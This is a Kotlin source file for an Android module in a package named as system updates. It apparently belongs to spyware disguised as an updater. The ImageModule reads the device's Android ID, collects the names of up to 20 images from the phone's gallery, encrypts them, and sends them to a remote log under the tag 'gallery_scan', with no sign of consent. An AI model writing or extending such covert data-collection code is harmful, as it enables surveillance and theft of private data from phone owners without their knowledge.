package com.system.updates.modules

import android.content.Context
import android.provider.MediaStore
import android.provider.Settings
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetUtils

object ImageModule {

    fun scanAndSendGalleryInfo(context: Context) {
        val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val projection = arrayOf(MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.SIZE)
        val cursor = context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection, null, null, null
        )

        val imageList = mutableListOf<String>()
        cursor?.use {
            val nameColumn = it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            while (it.moveToNext() && imageList.size < 20) {
                imageList.add(it.getString(nameColumn))
            }
        }

        if (imageList.isNotEmpty()) {
            val data = "Images Found: ${imageList.joinToString(", ")}"
            val encrypted = CryptoManager.encryptHybrid(data.toByteArray())
            NetUtils.sendLog(deviceId, "gallery_scan", encrypted.first, encrypted.second) { }
        }
    }
}
